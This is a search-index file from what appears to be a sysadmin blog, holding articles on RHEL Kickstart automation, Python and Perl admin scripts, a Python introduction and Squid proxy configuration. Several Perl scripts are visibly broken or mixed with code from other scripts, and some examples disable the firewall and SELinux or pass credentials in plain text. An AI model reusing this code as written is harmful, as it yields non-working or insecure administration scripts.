    index.add(
            {
                id:  321 ,
                href: "\/Cr%C3%A9er_un_Kickstart_Red_Hat_pour_automatiser_les_installation\/",
                title: "Creating a Red Hat Kickstart to Automate Installations",
                description: "Learn how to automate Red Hat installations using the Kickstart method to deploy multiple machines efficiently.",
                content: " Operating System RHEL 6.2 Website Debian Website Last Update 07/05/2013 Introduction linkAutomating Red Hat installations quickly becomes essential if you have many machines to deploy. This is why the Kickstart method exists, allowing you to boot from virtually any media.\nKickstart File linkThe kickstart file is where all the installation and configuration options are defined. I won’t describe all available options as they are well documented on the Red Hat website, but rather describe some interesting methods to achieve certain things that aren’t natively possible.\nHere’s an example of a very standard kickstart file to give you an idea:\n# Kickstart file # Minimal installation for production usage # Made by Deimos # Install instead of upgrade install # Use text mode install text # Use CDROM installation media cdrom # Installation logging level logging --level=info # System keyboard keyboard us # System language lang en_US # Disable firewall firewall --disabled # SELinux configuration selinux --disabled # Root password rootpw --iscrypted $1$6qaKy76d$R8ToaKxZD4Q89pJWrpE/y. # System authorization information auth --useshadow --passalgo=sha512 # Do not configure the X Window System skipx # System timezone timezone --isUtc Europe/Paris # Network information network --bootproto=dhcp --device=eth0 --onboot=on # System bootloader configuration bootloader --location=mbr # Clear the Master Boot Record zerombr # Partition clearing information clearpart --all --initlabel # Disk partitioning information part /boot --fstype=\"ext4\" --size=512 part pv.os --size=65536 --grow part swap --size=1000 --maxsize=2000 volgroup vgos pv.os logvol / --vgname=vgos --name=root --size=8096 logvol /var --vgname=vgos --name=var --size=8096 logvol /home --vgname=vgos --name=home --size=32768 # Packages installation %packages @base %end # Reboot after installation reboot Swap = RAM linkIf you want to have the swap size equal to the RAM size, you’ll need to create a pre-script that stores the swap creation line in a temporary file. Then it will be called by the kickstart:\n[...] # Partition clearing information clearpart --all --initlabel # Disk partitioning information part /boot --fstype=\"ext4\" --size=512 part pv.os --size=65536 --grow volgroup vgos pv.os %include /tmp/swappart logvol / --vgname=vgos --name=root --size=8096 logvol /var --vgname=vgos --name=var --size=8096 logvol /home --vgname=vgos --name=home --size=32768 %pre #!/bin/sh act_mem=$(awk '/MemTotal/{print int($2/1024)}' /proc/meminfo) echo \"logvol swap --fstype swap --name=swap --vgname=vgos --size=$act_mem\" \u003e /tmp/swappart Package Groups linkTo install package groups in the packages section, you need to precede the package group name with @. For example, here’s how to get the list of available groups:\n\u003e yum -v grouplist Installed Groups: Base (base) Compatibility libraries (compat-libraries) E-mail server (mail-server) [...] Available Groups: [...] High Availability (ha) High Availability Management (ha-management) [...] Available Language Groups: Afrikaans Support (afrikaans-support) [af] [...] If, for example, I want to add the High Availability group, I need to add this line:\n# Packages installation %packages @base @ha %end Creation linkDVD linkIf you want to boot from a DVD, insert an original DVD in the drive, then dump it somewhere on your machine:\nmkdir /mnt/rhdvd ~/iso mount /dev/cdrom /mnt/rhdvd cp -Rf /mnt/rhdvd/* ~/iso Next, we’ll edit the isolinux.cfg file to insert the kickstart parameters at the end:\ndefault vesamenu.c32 #prompt 1 timeout 600 display boot.msg menu background splash.jpg menu title Welcome to Red Hat Enterprise Linux 6.2! menu color border 0 #ffffffff #00000000 menu color sel 7 #ffffffff #ff000000 menu color title 0 #ffffffff #00000000 menu color tabmsg 0 #ffffffff #00000000 menu color unsel 0 #ffffffff #00000000 menu color hotsel 0 #ff000000 #ffffffff menu color hotkey 7 #ffffffff #ff000000 menu color scrollbar 0 #ffffffff #00000000 label linux menu label ^Install or upgrade an existing system menu default kernel vmlinuz append initrd=initrd.img ks=cdrom:/ks.cfg label vesa menu label Install system with ^basic video driver kernel vmlinuz append initrd=initrd.img xdriver=vesa nomodeset ks=cdrom:/ks.cfg label rescue menu label ^Rescue installed system kernel vmlinuz append initrd=initrd.img rescue label local menu label Boot from ^local drive localboot 0xffff label memtest86 menu label ^Memory test kernel memtest append - Then add your kickstart file (ks.cfg) to the root of your iso (~/iso).\nNow, let’s generate the new ISO:\nmkisofs -o ~/rhks.iso -b isolinux/isolinux.bin -c isolinux/boot.cat -no-emul-boot -boot-load-size 4 -boot-info-table -J -R -V \"RedHatKS\" . All that’s left is to load/burn your ISO and let things happen :-)\nReferences linkhttp://ihazem.wordpress.com/2012/04/06/creating-dynamic-swap-space-during-linux-kickstart/\nhttp://docs.redhat.com/docs/en-US/Red_Hat_Network_Satellite/5.3/html/Deployment_Guide/satops-kickstart.html\nhttp://techspotting.org/creating-a-kickstart-cd-dvd-fedora-redhat-centos/\nhttp://fedoraproject.org/wiki/Anaconda/Kickstart\nhttp://ihazem.wordpress.com/2012/04/06/creating-dynamic-swap-space-during-linux-kickstart/\n"
            }
        );
    index.add(
            {
                id:  322 ,
                href: "\/Mes_scripts_Python_qui_peuvent_servir_d\u0027exercices\/",
                title: "My Python Scripts That Can Serve as Exercises",
                description: "A collection of Python scripts that can serve as learning exercises for beginners, including a script for automating package signing and pushing in Red Hat Satellite.",
                content: " Software version 2.7 / 3.2 Website Python Website Last Update 06/06/2012 Introduction linkIt’s not always easy to start learning a programming language, especially when you’ve never studied it in school! That’s why I’m offering some small scripts that I created right after going through some books. The scripts should increase in difficulty more or less progressively.\nRed Hat Satellite linkI created this script for the Red Hat Satellite server to save time when signing and sending multiple packages to a Satellite server:\n(satellite_add_packages.py)\n#!/usr/bin/env python # Made by Pierre Mavro 14/03/2012 # Version : 0.1 # This script permit to automate in a non secure way, new packages for a custom repository on Red Hat Satellite # Require : pexpect import getopt, os, sys, glob, pexpect from string import Template # Help cmd_name = sys.argv[0] def help(code): print cmd_name, \"[-h] [-r] [-s] [-l] [-p] [-d]\" str = \"\"\" -h, --help Show this help -s, --passphrase Passphrase to sign packages -r, --repository Select wished repository to push the packages -l, --login Red Hat Network username -p, --password Red Hat Network password -f, --folder folder were new packages should be added (default: /tmp/packages) -d, --debug Debug mode \"\"\" print str sys.exit(code) class bcolors: OK = '\\033[92m' FAIL = '\\033[91m' END = '\\033[0m' def disable(self): self.OK = '' self.FAIL = '' self.END = '' # Sign and push function def sign_push(passphrase,repository,login,password,folder,debug): # Package signing def sign(rpm_files,passphrase,folder,debug,charspacing): if (debug == 1): print 80*'=' + \"\\n\" print '[+] Signing packages :' # Sign all packages for package in rpm_files: # Formating charspace = Template(\"{0:\u003c$space}\") print charspace.substitute(space = charspacing).format(' - ' + package + '...'), # Launch resign child = pexpect.spawn('rpm --resign ' + package) if (debug == 1): child.logfile = sys.stdout child.expect ('Enter pass phrase|Entrez la phrase de passe') child.sendline (passphrase) if (debug == 1): child.logfile = sys.stdout child.expect(pexpect.EOF) child.close() # Check return status if (child.exitstatus == 0): print '[ ' + bcolors.OK + 'OK' + bcolors.END + ' ] ' else: print '[ ' + bcolors.FAIL + 'FAIL' + bcolors.END + ']' # Package push def push(rpm_files,repository,login,password,folder,debug,charspacing): if (debug == 1): print 80*'=' + \"\\n\" print '[+] Adding packages to satellite server :' for package in rpm_files: # Formating charspace = Template(\"{0:\u003c$space}\") print charspace.substitute(space = charspacing).format(' - ' + package + '...'), # RPM push command child = pexpect.spawn('rhnpush --force --no-cache -c ' + repository + ' ' + package) if (debug == 1): child.logfile = sys.stdout child.expect ('Red Hat Network username') child.sendline (login) child.expect ('Red Hat Network password') child.sendline (password) if (debug == 1): child.logfile = sys.stdout child.expect(pexpect.EOF) child.close() # Check return status if (child.exitstatus == 0): print '[ ' + bcolors.OK + 'OK' + bcolors.END + ' ] ' else: print '[ ' + bcolors.FAIL + 'FAIL' + bcolors.END + ' ]' # Get rpm files list rpm_files=glob.glob(folder + '/*.rpm') if (debug == 1): print 80*'=' + \"\\n\" + 'RPM found :' if (debug == 1): print rpm_files # Check if RPM were found if (len(rpm_files) == 0): print \"No RPM were found in \" + folder sys.exit(2) # Get maximum rpm size for visual answers (OK/FAIL) charspacing=0 for package in rpm_files: count = len(package) if (count \u003e charspacing): charspacing=count charspacing += 10 # Sign packages sign(rpm_files,passphrase,folder,debug,charspacing) # Push packages push(rpm_files,repository,login,password,folder,debug,charspacing) # Main def main(argv): try: opts, args = getopt.getopt(argv, 'hs:r:l:p:f:d', [\"passphrase=\",\"repository=\",\"login=\",\"password=\",\"folder=\",\"help\"]) except getopt.GetoptError: # Print help and exit print \"Unknow option, bad or missing argument\\n\" help(2) # Initialize vars # GPG passphrase for package sign in passphrase=None repository=None login=None password=None folder='/tmp/' debug=0 # Check opts for opt, arg in opts: if opt in (\"-h\", \"--help\"): help(0) sys.exit(0) elif opt in (\"-s\", \"--passphrase\"): passphrase = str(arg) elif opt in (\"-r\", \"--repository\"): repository=str(arg) elif opt in (\"-l\", \"--login\"): login=str(arg) elif opt in (\"-p\", \"--password\"): password=str(arg) elif opt in (\"-f\", \"--folder\"): folder=str(arg) elif opt in (\"-d\", \"--debug\"): debug=1 else: print \"Unknow option, please see usage\\n\" help(2) # Checks if (passphrase or repository or login or password) is None: print \"Unknow option, please see usage\\n\" help(2) sign_push(passphrase,repository,login,password,folder,debug) if __name__ == \"__main__\": main(sys.argv[1:]) "
            }
        );
    index.add(
            {
                id:  323 ,
                href: "\/Mes_scripts_Perl_qui_peuvent_servir_d\u0027exercices\/",
                title: "My Perl Scripts That Can Serve as Exercises",
                description: "A collection of Perl scripts for practical training, including scripts for monitoring Java applications, managing SFTP accounts, watching log files, and more.",
                content: "Introduction linkIt’s not always easy to start with a programming language, especially when you’ve never studied it in school! That’s why I’m offering some small scripts I made right after going through some books. These scripts should increase in difficulty as you go along.\nPS, Java and XMX linkFor work, I had to create a script for Solaris that lists users, PIDs, launch dates for Java processes, and some other information. The goal was to display XMX values without the entire Java command inserted, or other unnecessary information for the people who were going to use this script. Here is my first Perl script:\n#!/usr/bin/perl -w ## Java Status Script for Solaris ## ## Made by Pierre Mavro ## use strict; my $line; my $ups; print \"\\n############## Bridge Status ##############\\n\\n\"; print \" USER\\t PID\\t%MEM TIME XMX\\n\"; open FILE, \"ps -edfo user,pid,pmem,stime,args \\| grep java \\| grep -v grep |\"; while ($line = ){ if ($line =~ /^(.*[_|:]\\d+).*/) { $ups = $1; if ($line =~ /.*-Xmx(\\d+)/) { print \"$ups $1M\\n\"; } else { print \"$ups NO XMX DEFINED\\n\"; } } } close FILE; print \"\\n\" Creating SFTP User Accounts linkThis script was designed to create and delete SFTP user accounts. It then sends an email to the admin, and copies to the concerned person. There is also automatic password generation.\n#!/usr/bin/perl -w ## SFTP Mangament Script ## ## Made by Pierre Mavro ## ## Needed componants # - apg # - Perl \"Mail::Sender::Easy\" module use strict; # Load Modules use Mail::Sender::Easy qw(email); die \"USAGE: manage_sftp_user.pl [create|delete] username login(\\@mycompany.com of the consultant mail)\\n\" if ($ARGV[0] !~ /(create|delete|remove)/); my $create_account; my $gen_pass; my $crypted_pass; my $user_login = $ARGV[1]; my $mail_cc = $ARGV[2]; # Functions # User deletion sub user_del { if ($ARGV[0] eq \"delete\") { system \"sftp-kill\", $user_login; system \"userdel\", \"-r\", $user_login; system \"rm\", \"-Rf\", \"/home/clients/$user_login\"; } } # User creation sub user_add { if ($ARGV[1]) { # Check if user exist foreach $radius_user_files (@all_existing_radius_users) { open (FILER, \"\u003c$radius_user_files\") || die(\"Can't open file: $!\"); while () { if ($_ =~ /^(\\w+).+Auth-Type.+\".*\"/) { if ($1 eq $ARGV[1]) { die(\"Sorry but user already exist\\n\"); } } } close (FILER); # Generate password $password = `$apg_exec -a0 -n1 -x10 -m10 -MCN`; chomp $password; # Write to raddius files open (FILEW, \"\u003e\u003e$radius_user_files\") || die(\"Can't write file: $!\"); printf FILEW \"%-15s\", \"$ARGV[1]\"; print FILEW \"\\t\\tAuth-Type := Local, User-Password == \\\"$password\\\"\\n\"; print FILEW \"\\t\\t\\tFilter-Id = \\\"vpnhome\\\"\\n\\n\"; close (FILEW); # Push to arrays for sending mails $user_pass_id = 0; push @tab_users, $ARGV[1]; push @tab_pass, $password; } } else { \u0026help; } } sub send_mail { # Just a verification to be sure that the username folder has been created if ( -d \"/home/clients/$user_login\" ) { email({ 'from' =\u003e 'it-system@mycompany.com', 'to' =\u003e 'it-system@mycompany.com', 'cc' =\u003e \"$mail_cc\\@mycompany.com\", 'subject' =\u003e \"New SFTP Account for $user_login\", 'priority' =\u003e 2, 'confirm' =\u003e '', 'smtp' =\u003e 'localhost', 'port' =\u003e '25', 'auth' =\u003e '', 'authid' =\u003e '', 'authpwd' =\u003e '', '_text' =\u003e '', '_html' =\u003e \"Informations on configuration of an SFTP Client to connect to mycompany SFTP Server:\nHost address: sftp.mycompany.com\nPort: 22\nLogin: $user_login\nPassword: $gen_pass\nIf you are on windows, we recommand this client: WinSCP\nThose informations are confidentials, please keep them safetly.\", }) or die \"email() failed: $@\"; } } # Launch die \"USAGE: manage_sftp_user.pl [create|delete] username login(\\@mycompany.com of the consultant mail)\\n\" if ((@ARGV \u003e \"3\") or (@ARGV \u003c \"2\")); if ($ARGV[0] eq \"delete\") { \u0026user_del; } elsif ($ARGV[0] eq \"create\") { die \"USAGE: manage_sftp_user.pl [create|delete] username login(\\@mycompany.com of the consultant mail)\\n\" if (@ARGV ne \"3\"); \u0026user_add; \u0026send_mail; } Controlling the Number of Users for MySecureShell linkAs one of the founders of MySecureShell, I had to create scripts for Nagios agents. Here’s a script to monitor the number of users compared to the maximum:\n#!/usr/bin/perl -w # # Usage: check_mss_users ([warn] [critical] are optionals) # # Nagios script to check MySecureShell users (can be checked only on MySecureShell server) # # Made by Pierre Mavro / MySecureShell Team use strict; #### Vars can be touched #### my $sftp_who = \"/usr/bin/sftp-who\"; # sftp-who binary #### Do not edit now #### my $warn_mss_users = $ARGV[0] or 0.75; # warning MySecureShell users or using 75% by default my $crit_mss_users = $ARGV[1] or 0.90; # critical MySecureShell users or using 90% by default my $max_mss_users; my $curr_mss_users; sub get_infos { # Check config file and read config file to check LimitConnection value open (SFTP_WHO, \"$sftp_who |\") or die \"Couldn't execute $sftp_who binary: $!\\n\"; while (my $line = ) { # Find the currently and maximum connected users if ($line =~ /^---.(d+).\\/.(\\d+).clients/) { $curr_mss_users = $1; $max_mss_users = $2; } } close SFTP_WHO; } sub check { if ($curr_mss_users \u003c $warn_mss_users) { print \"USERS OK - currently connected $curr_mss_users / $max_mss_users |users=$curr_mss_users;$warn_mss_users;$crit_mss_users\\n\"; exit(0); } elsif ($curr_mss_users \u003c $crit_mss_users) { print \"USERS WARNING - currently connected $curr_mss_users / $max_mss_users\\n\"; exit(1); } else { print \"USERS CRITICAL - currently connected $curr_mss_users / $max_mss_users\\n\"; exit(2); } } # If the twice values are defined if ((defined($warn_mss_users)) and (defined($crit_mss_users))) { \u0026get_infos; \u0026check; # If only one value is defined } elsif ((defined($warn_mss_users)) or (defined($crit_mss_users))) { print \"Usage: check_mss_users ([warn] [critical] are optionals)\\n\"; exit(-1); # If no values are defined, defaults are used } else { \u0026get_infos; \u0026check; } Managing Freeradius Accounts linkHere is a script that manages (add/delete) radius accounts. It also allows you to change passwords, remind users that their password will change by email, and resend credentials for forgetful people.\nYou can also list people with their credentials in a nice table and replicate to secondary radius servers via SSH.\nFor Radius to work correctly afterwards, you’ll need to add this to /etc/freeradius/users:\n$INCLUDE vpn_users For the usage of this script, you’ll need to add the script to crontab with:\ngenerate: to generate new passwords in a new file and send an email to each user reminder: to remind users that their password will change switch: to use the new file with the new credentials #!/usr/bin/perl -w ## VPN Users Management v0.3 ## ## Made by Pierre Mavro ## ## DEPENDANCIES ## # For this working script, you need: # - apg command # - File::Copy perl module # - Mail::Sender perl module # - Net::SSH perl module # - Net::SCP perl module use strict; # Load Modules use File::Copy; use Mail::Sender; use Net::SSH qw(ssh); use Net::SCP qw(scp); # Verify syntax unless ($ARGV[0]) { \u0026help; } ## Vars ## my $apg_exec = \"/usr/bin/apg\"; # APG executable location my $radius_user_file = \"/etc/freeradius/vpn_users\"; # Radius users file my $radius_user_file_bak = \"/etc/freeradius/vpn_users_bak\"; # Radius backup user file my $radius_user_file_new = \"/etc/freeradius/vpn_users_new\"; # Radius new users temp file my $radius_user_file_tmp = \"/etc/freeradius/vpn_users_tmp\"; # Radius users file my @all_existing_radius_users; # Get all radius users files my $mail_fqdn = \"myconpany.com\"; # Will be use for your company fqdn mail my @radius_nodes = qw(tasmania); # Radius server node list (must have ssh keys) # Do not touch my @tab_users_unsorted; my @tab_users; my @tab_pass; my $user; my $password; my $number_of_users; my $user_pass_id; my $scp; my $node; my $radius_user_files; # Add the new radius user file to array to upgrade new file too $all_existing_radius_users[0] = $radius_user_file; if (-f $radius_user_file_new) { push @all_existing_radius_users, $radius_user_file_new; } ## Testing dependancies ## die \"Sorry but APG could not be found, please install it or change the location (actually: $apg_exec)\\n\" if (! -f $apg_exec); ## Functions ## # Help sub help { print \"USAGE: vpn_user_management.pl [list|create|delete|generate|switch|reminder|send|replicate|help] [user_login]\\n\"; print \"\\t- list: list all users with their password\\n\"; print \"\\t- create: create user (eg. vpn_user_management.pl create username)\\n\"; print \"\\t- delete: delete user (eg. vpn_user_management.pl delete username)\\n\"; print \"\\t- reminder: resend new credentials by mail (eg. vpn_user_management.pl reminder (WARNING, this will send to all users))\\n\"; print \"\\t- generate: generate a file with new passwords and send them by mail (eg. vpn_user_management.pl generate)\\n\"; print \"\\t- switch: switch to new credentials (new to last generated credentials file)\\n\"; print \"\\t- send: send credentials to one user or all users (eg. vpn_user_management.pl send [username|all])\\n\"; print \"\\t- replicate: replicate the configuration to other nodes and restart (eg. vpn_user_management.pl replicate)\\n\"; print \"\\t- help: print this page\\n\"; exit (1); } GC Log Analyzer linkHere’s a small script to monitor GC logs and alert after a certain percentage of overrun. It also warns if a Full GC occurs:\n#!/usr/bin/perl -w ## GC Analyzer tool v0.1 ## ## Made by Pierre Mavro ## ## DEPENDANCIES ## # To make this script working, you need: # - Mail::Sender perl module use strict; use Mail::Sender; ## Vars ## # Global vars my $product=\"Confluence\"; # Give the product name # Mails parameters my $mail_smtp_server=\"localhost\"; # Set the ip or mail name server my $mail_user_from=\"admin\"; # Set the mail sender name my $mail_user_to=\"admin\"; # Set the mail receiver name my $mail_fqdn=\"company.com\"; # Set the FQDN for incomming mails (eg. user@ # Others vars my $log_gc_file=$ARGV[0]; my $percent_gc_warn=$ARGV[1]; my $total_curr_gc; my $percent_gc; my $mail_subject; my $problem_line; my $mail_status; my $curpos; # Verifications \u0026help if (@ARGV \u003c 2); ### Starting Analyze ### ## Funtions ## # Help sub help { print \"USAGE: gc_analyzer.pl [LOG GC File] [Percent for warning]\\n\"; print \"\\t- eg: gc_analyzer.pl /home/pmavro/loggc 20\\n\"; print \"\\t- help: print this page\\n\"; exit (1); } # Send mail sub send_mail { if ($mail_status eq \"warning\") { $mail_subject=\"WARNING ($product): $percent_gc_warn% of GC memory has been reached!\"; } elsif ($mail_status eq \"critical\") { $mail_subject=\"CRITICAL ($product): A Full has proceed\"; } eval { (new Mail::Sender) -\u003eOpenMultipart({ smtp =\u003e \"$mail_smtp_server\", from =\u003e \"$mail_user_from\\@$mail_fqdn\", to =\u003e \"$mail_user_to\\@$mail_fqdn\", subject =\u003e \"$mail_subject\", multipart =\u003e 'mixed', }) -\u003ePart({ctype =\u003e 'text/html', disposition =\u003e 'NONE', msg =\u003e \u003c"
            }
        );
    index.add(
            {
                id:  324 ,
                href: "\/Introduction_au_Python\/",
                title: "Introduction to Python",
                description: "A comprehensive introduction to Python programming language, covering syntax, data types, structures, functions, modules, and useful libraries.",
                content: " Software version 2.7 / 3.2 Website Python Website Last Update 06/06/2012 Introduction linkPython is an interpreted, multi-paradigm programming language. It supports structured imperative programming and object-oriented programming. It features strong dynamic typing, automatic memory management through garbage collection, and an exception handling system; thus it is similar to Perl, Ruby, Scheme, Smalltalk, and Tcl.\nThe Python language is under a free license similar to the BSD license and runs on most computing platforms, from supercomputers to mainframes, from Windows to Unix including Linux and MacOS, with Java or even .NET. It is designed to optimize programmer productivity by providing high-level tools and a simple syntax. It is also appreciated by educators who find in it a language where syntax, clearly separated from low-level mechanisms, allows for an easier introduction to basic programming concepts.\nAmong all the programming languages currently available, Python is one of the easiest to learn. Python was created in the late ’80s and has matured enormously since then. It comes pre-installed in most Linux distributions and is often one of the most overlooked when choosing a language to learn. We’ll confront command-line programming and play with GUI (Graphical User Interface) programming. Let’s dive in by creating a simple application.\nIn this documentation, we’ll see how to write Python code and we’ll use the interpreter (via the python command). The lines below corresponding to the interpreter will be visible via elements of this type: ‘»\u003e’ or ‘…’\nWhen you write a file that should understand Python, it should contain this at the beginning (the Shebang and encoding):\n#!/usr/bin/env python # -*- coding:utf-8 -*- The encoding line is optional but necessary if you use accents.\nSyntax linkIn Python, we must indent our lines to make them readable and especially for them to work. You need to indent using tabs or spaces. Be careful not to mix the two, Python doesn’t like that at all: your code won’t work and you won’t get an explicit error message.\nYou can use comments at the end of lines if you wish. Here’s an example:\nbloc1 blabla # comment1 Suite du bloc1 blibli # comment2 The end of a block is automatically done with a line break.\nhelp linkKnow that at any time you have the possibility to ask for help thanks to the help command. For example for help with the input method:\n\u003e\u003e\u003e help(input) Help on built-in function input in module __builtin__: input(...) input([prompt]) -\u003e value Equivalent to eval(raw_input(prompt)). You can also access this help from the shell using the pydoc command:\npydoc input Displaying text linkLet’s see the first most basic command, displaying text:\n\u003e\u003e\u003e print 'Deimos Fr' Deimos Fr Then here’s how to concatenate 2 elements:\n\u003e\u003e\u003e print 'Deimos ' + 'Fr' Deimos Fr \u003e\u003e\u003e print 'Deimos', 'Fr' Deimos Fr When using the comma, strings are automatically separated by a space character, whereas when using concatenation, you have to manually manage this issue. If you concatenate non-string variables, you’ll need to convert them before you can display them:\n\u003e\u003e\u003e c = 3 \u003e\u003e\u003e print 'Value: ' + c Traceback (most recent call last): File \"\", line 1, in TypeError: cannot concatenate 'str' and 'int' objects \u003e\u003e\u003e print 'Value: ' + str(c) Value: 3 \u003e\u003e\u003e print 'Value:', c Value: 3 If you don’t want to have an automatic line return (the equivalent of “\\n”), you simply put a comma at the end of your line:\n\u003e\u003e\u003e print 'No \\n', In Python 3.2, here’s how to print:\n\u003e\u003e\u003e print('Deimos', 'Fr') Deimos Fr sep linkIn Python 3.2, with sep we can separate strings with characters:\n\u003e\u003e\u003e print('Deimos', 'Fr', sep='--') Deimos--Fr \u003e\u003e\u003e print('a', 'b', 'c', 'd', sep=',') a,b,c,d end linkIn Python 3.2, with end we can add a character at the end of a string:\n\u003e\u003e\u003e print('Deimos', 'Fr', sep='--', end='!') Deimos--Fr! Data types linkThere are several data types in Python:\nIntegers: allow representing integers on 32 bits (from -2,147,483,648 to 2,147,483,647). \u003e\u003e\u003e type(2) "
            }
        );
    index.add(
            {
                id:  325 ,
                href: "\/Squid_:_Installation_et_configuration_de_Squid\/",
                title: "Squid: Installation and Configuration of Squid",
                description: "Guide for installing and configuring the Squid proxy server on Debian and FreeBSD systems, with example configurations and security best practices.",
                content: " Software version 2.7 Operating System FreeBSD 9\nDebian 6 Website Squid Website Last Update 06/06/2012 Introduction linkA Squid server is a proxy server capable of using FTP, HTTP, Gopher, and HTTPS protocols. Unlike conventional proxy servers, a Squid server handles all requests in a single, non-blocking input/output process.\nIt’s free software distributed under the GNU GPL license.\nSquid keeps metadata and especially the most frequently used data in memory. It also stores DNS requests in memory, as well as failed requests. DNS requests are non-blocking.\nCached data can be arranged in hierarchies or meshes to use less bandwidth.\nSquid is inspired by the Harvest project. It is compatible with IPv6 from version 3 onwards.\nInstallation linkDebian linkThe installation is simple:\naptitude install squid FreeBSD linkInstallation is easy:\npkg_add -vr squid Then initialize the cache:\n\u003e squid -z 2012/05/29 05:20:40| Creating Swap Directories Then set Squid to start at boot:\n# Squid squid_enable=\"YES\" And finally we’ll create the most basic configuration file possible:\ncp /usr/local/etc/squid/squid.conf /usr/local/etc/squid/squid.conf.default grep -v \"^#\" \u003c /usr/local/etc/squid/squid.conf.default | sed '/^$/d' \u003e /usr/local/etc/squid/squid.conf Configuration linkExample 1 link #------------------------------------------------------------------------------- # Minimum configuration #------------------------------------------------------------------------------- acl all src all acl manager proto cache_object acl localhost src 127.0.0.1/32 acl to_localhost dst 127.0.0.0/8 0.0.0.0/32 # Squid listening port http_port 3128 #------------------------------------------------------------------------------- # Security #------------------------------------------------------------------------------- #chroot on # Chroot Squid deamon forwarded_for off # Hide source IP visible_hostname proxy.deimos.fr # Mask proxy name httpd_suppress_version_string on # Hide squid version #------------------------------------------------------------------------------- # ACL network definition #------------------------------------------------------------------------------- acl wifi_net src x.x.x.x/24 # Wifi network acl wan_net src x.x.x.x/24\t# Wan local network #------------------------------------------------------------------------------- # ACL Ports definition #------------------------------------------------------------------------------- acl SSL_ports port 443 acl Safe_ports port 80\t# http acl Safe_ports port 21\t# ftp acl Safe_ports port 443\t# https acl Safe_ports port 70\t# gopher acl Safe_ports port 210\t# wais acl Safe_ports port 1025-65535\t# unregistered ports acl CONNECT method CONNECT #------------------------------------------------------------------------------- # Specific ACL #------------------------------------------------------------------------------- # Apache mod_gzip and mod_deflate known to be broken so don't trust # Apache to signal ETag correctly on such responses acl apache rep_header Server ^Apache broken_vary_encoding allow apache #We recommend you to use at least the following line hierarchy_stoplist cgi-bin ? #------------------------------------------------------------------------------- # Allow/Deny access #------------------------------------------------------------------------------- # Minimal access http_access allow manager localhost http_access deny manager # Deny requests to unknown ports http_access deny !Safe_ports # Deny CONNECT to other than SSL ports http_access deny CONNECT !SSL_ports http_access deny to_localhost # Custom access http_access allow wifi_net # And finally deny all other access to this proxy http_access deny all #------------------------------------------------------------------------------- # Internet Cache Protocol #------------------------------------------------------------------------------- icp_access allow wifi_net icp_access deny all #------------------------------------------------------------------------------- # Cache properties #------------------------------------------------------------------------------- cache_mgr root # Email contact in cache die case # cache_dir ufs Directory-Name Mbytes L1 L2 [options] cache_dir ufs /var/squid/cache 1024 16 256 maximum_object_size 10240000 KB # Set maximum file size to be cached # Cache expiration patterns refresh_pattern ^ftp:\t1440\t20%\t10080 refresh_pattern ^gopher:\t1440\t0%\t1440 refresh_pattern -i (/cgi-bin/|\\?) 0\t0%\t0 refresh_pattern .\t0\t20%\t4320 #------------------------------------------------------------------------------- # Performances Tuning #------------------------------------------------------------------------------- pipeline_prefetch on # To boost the performance of pipelined requests #------------------------------------------------------------------------------- # Logs #------------------------------------------------------------------------------- access_log /var/squid/logs/access.log squid cache_log /var/squid/logs/cache.log cache_store_log /var/squid/logs/store.log coredump_dir /var/squid/cache buffered_logs on # Will speed up if there is not a lot of logs debug_options ALL,1 # Set log level 1 -\u003e 9 Example 2 linkFor configuration, I won’t go into details, but here’s an overview of a working configuration that is quite restrictive:\nhttp_port 3129 http_port 3128 icp_port 3131 # Be more anonymous # That's three pieces of information you may not want to give away: # - The host name of your proxy server # - The version of Squid it's running # - The IP address of the system that's making the request via the proxy forwarded_for off visible_hostname proxy.local httpd_suppress_version_string on ####auth_param basic program /usr/lib/squid/squid_ldap_auth -b dc=openldap,dc=mycompany,dc=lan -f 'uid=%s' -s sub ldap #auth_param basic program /usr/lib/squid/squid_ldap_auth -v 3 -b dc=openldap,dc=mycompany,dc=lan -f \"(\u0026(objectClass=mycompanyUser)(uid=%s))\" -s sub -H ldap://ldap auth_param basic credentialsttl 2 hours #auth_param basic realm Web-Proxy #acl Authentified proxy_auth REQUIRED acl all\tsrc 0.0.0.0/0 acl mycompany dstdomain mycompany.net acl mycompany dstdomain mycompany.com acl mycompany dstdomain mycompany.lan # Concurent access #url_rewrite_concurrency 20 # White and Black lists #acl url_blacklist dstdom_regex -i \"/etc/squid/bidon.txt\" #acl good_domains dstdom_regex -i \"/etc/squid/good_domains\" acl url_whitelist dstdom_regex -i \"/etc/squid/url_whitelist.txt\" acl url_blacklist dstdom_regex -i \"/etc/squid/url_blacklist.txt\" acl dst_whitelist dst \"/etc/squid/dst_whitelist.txt\" acl dst_blacklist dst \"/etc/squid/dst_blacklist.txt\" # Facebook acl facebook dstdom_regex facebook.com acl srcfacebook src 10.101.4.253/32 acl srcfacebook src 10.101.0.253/32 acl srcfacebook src 10.101.0.107/32 acl srcfacebook src 10.101.4.23/32 # SuperUser acl SuperUser src 10.101.4.253/32 # Monster acl monsternet\tdst 208.71.196.0/24 acl monsternet\tdst 63.112.169.0/24 acl monsterdom dstdom_regex newjobs.com monster.com # Bypass proxy acl binaries_ext url_regex -i \\.iso$ \\.zip$ \\.deb$ \\.rpm$ \\.gz$ \\.bz2$ \\.exe$ \\.cab$ \\.bin$ \\.tgz$ \\.msi$ \\.sh$ acl binaries_mime req_mime_type -i ^application/x-debian-package$ ^application/x-bzip2$ acl tunnelurl url_regex ^http://.*/IDLE/[0-9]+$ acl tunnelurl url_regex ^http://.*/SEND/[0-9]+$ acl tunnelmethod method POST acl videoreq req_mime_type -i ^video/x-ms-wmv$ acl audioreq req_mime_type -i ^audio/mpeg$ acl tunnelreq req_mime_type -i ^application/x-fcs$ acl videorep rep_mime_type -i ^video/x-ms-wmv$ acl audiorep rep_mime_type -i ^audio/mpeg$ acl tunnelrep rep_mime_type -i ^application/x-fcs$ acl manager proto cache_object acl localhost src 127.0.0.1/32 acl to_localhost dst 127.0.0.0/8 acl localnet src 10.0.0.0/8 # RFC1918 possible internal network acl localnet src 172.16.0.0/12 # RFC1918 possible internal network acl localnet src 192.168.0.0/16 # RFC1918 possible internal network # SSL Ports acl SSL_ports port 443 acl SSL_ports port 5050\t# yahoo # Allow outbound ports acl Safe_ports port 80\t# http acl Safe_ports port 8080\t# http acl Safe_ports port 11371\t# gpg key acl Safe_ports port 21\t# ftp acl Safe_ports port 21\t# ftp acl CVS_port port 2401\t# CVS acl CONNECT method CONNECT # Bypass hours acl timeok time 18:00-23:59 acl timeok time 00:00-09:00 acl timeok time 12:00-14:00 acl timeok time AS acl visio src 10.101.3.17/32 acl visio src 10.101.3.9/32 # Google talk ACL 